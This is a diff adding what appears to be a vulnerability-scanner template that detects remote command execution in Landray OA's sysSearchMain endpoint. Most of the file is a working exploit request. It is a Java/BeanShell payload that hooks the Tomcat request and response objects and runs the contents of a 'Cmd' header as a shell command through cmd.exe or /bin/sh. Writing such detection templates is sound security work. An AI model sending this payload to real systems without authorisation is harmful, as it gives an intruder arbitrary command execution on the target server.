@@ -1,0 +1,26 @@
+id: landray-oa-syssearchmain-rce
+info:
+  name: Landray OA sysSearchMain Command Execution
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: rce
+  description: |
+    This template detects remote command execution vulnerability in Landray OA sysSearchMain.
+
+http:
+  - raw:
+      - |
+        POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cmd: dir
+
+        var={"body":{"file":"/sys/search/sys_search_main/sysSearchMain.do?method=editParam"}}&fdParemNames=11&fdParameters=<java><void class="bsh.Interpreter"><void method="eval"><string> boolean flag = false; ThreadGroup group = Thread.currentThread().getThreadGroup(); java.lang.reflect.Field f = group.getClass().getDeclaredField("threads"); f.setAccessible(true); Thread[] threads = (Thread[]) f.get(group); for (int i = 0; i < threads.length; i++) { try { Thread t = threads[i]; if (t == null) { continue; } String str = t.getName(); if (str.contains("exec") || !str.contains("http")) { continue; } f = t.getClass().getDeclaredField("target"); f.setAccessible(true); Object obj = f.get(t); if (!(obj instanceof Runnable)) { continue; } f = obj.getClass().getDeclaredField("this$0"); f.setAccessible(true); Object obj2 = f.get(obj); f = obj2.getClass().getDeclaredField("handler"); f.setAccessible(true); Object obj3 = f.get(obj2); f = obj3.getClass().getDeclaredField("processors"); f.setAccessible(true); java.util.List processors = (java.util.List) f.get(obj3); for (int j = 0; j < processors.size(); ++j) { Object processor = processors.get(j); f = processor.getClass().getDeclaredField("req"); f.setAccessible(true); Object req = f.get(processor); Object resp = req.getClass().getMethod("getResponse", new Class[0]).invoke(req, new Object[0]); String str = (String) req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"Cmd"}); if (str != null && !str.isEmpty()) { resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{200}); String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", str} : new String[]{"/bin/sh", "-c", str}; String charsetName = System.getProperty("os.name").toLowerCase().contains("window") ? "GBK" : "UTF-8"; byte[] text2 = (new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream(), charsetName)).useDelimiter("\\A").next().getBytes(charsetName); byte[] result = ("Execute:    " + new String(text2, "utf-8")).getBytes(charsetName); try { Class cls = Class.forName("org.apache.tomcat.util.buf.ByteChunk"); obj = cls.newInstance(); cls.getDeclaredMethod("setBytes", new Class[]{byte[].class, int.class, int.class}).invoke(obj, new Object[]{result, new Integer(0), new Integer(result.length)}); resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, new Object[]{obj}); } catch (NoSuchMethodException var5) { Class cls = Class.forName("java.nio.ByteBuffer"); obj = cls.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(cls, new Object[]{result}); resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, new Object[]{obj}); } flag = true; } if (flag) { break; } } if (flag) { break; } } catch (Exception e) { continue; } }</string></void></void></java>
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Landray.log"
+          - "catalina.sh"
+          - "<DIR>"
+        part: body
